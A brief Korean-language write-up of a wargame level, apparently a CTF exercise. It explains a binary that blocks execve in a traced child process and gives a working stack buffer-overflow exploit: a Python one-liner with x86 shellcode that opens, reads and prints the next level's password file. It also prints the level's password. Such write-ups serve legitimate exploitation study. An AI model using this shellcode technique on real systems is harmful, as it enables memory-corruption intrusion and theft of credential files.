> Password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

level04 프로그램을 분석해보면

fork()를 한 이후, 자식 프로세스에서 ptrace(PTRACE_TRACEME ...); 을 호출한 이후 버퍼 오버플로우에 취약한 gets함수를 호출하고,
부모 프로세스에서는 wait이후 자식이 받은 시그널을 확인해서 자식이 execve계열 호출을 하였는지 확인하고, execve호출을 하였을 때 더 이상 진행하지 못하게 막는 프로그램이다.

자식 프로세스에서 gets를 사용한다는 점에서 매우 쉽게 취약점을 공격할 수 있지만, 자주 사용했던 execve("/bin/sh", NULL, NULL);을 사용할 수 없는 문제이다.

따라서 정직하게 open("/home/users/level05/.pass") -> read(fd, buf, 0x28); -> write(1, buf, 0x28); 순으로 비밀번호를 직접 출력하는 코드를 주입하면 된다.

```bash
python -c 'import sys; sys.stdout.write("/home/users/level05/.pass\x00" + "\x90" * 75 + "\xb8\x05\x00\x00\x00\xbb\x70\xd6\xff\xff\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\xb9\x70\xd6\xff\xff\xba\x28\x00\x00\x00\xcd\x80\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x70\xd6\xff\xff\xba\x28\x00\x00\x00\xcd\x80" + "\x7a\xd6\xff\xff")' | ./level04
```